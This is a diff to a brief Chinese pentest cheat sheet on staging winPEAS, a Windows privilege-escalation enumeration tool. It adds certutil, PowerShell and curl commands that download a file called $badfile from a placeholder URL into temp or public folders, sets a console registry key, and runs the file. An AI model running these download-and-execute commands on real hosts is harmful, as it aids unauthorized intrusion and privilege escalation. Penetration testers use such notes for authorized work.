@@ -1,10 +1,15 @@
 项目地址:https://github.com/peass-ng/PEASS-ng
+>下载winpeas到C:\windows\temp目录下
 certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+>适用于temp目录不可写的时候，往公共用户目录写
+certutil -urlcache -split -f $downloadurl C:\users\public\$badfile
+>用powershell下载
+powershell -c "Invoke-WebRequest $downloadurl -OutFile C:\windows\temp\$badfile"
+> in powershell
+iwr -uri $downloadurl -outfile C:\windows\temp\$badfile
+>用curl下载
+curl $downloadurl -o C:\windows\temp\$badfile
+>改注册表使得winpeas能够格式化输出
 REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+>运行winpeas
 C:\windows\temp\$badfile
-
-###
-第一条命令为下载winpeas到C:\windows\temp目录下
-第二条命令为改注册表使得winpeas能够格式化输出
-第三条命令为运行winpeas
-###
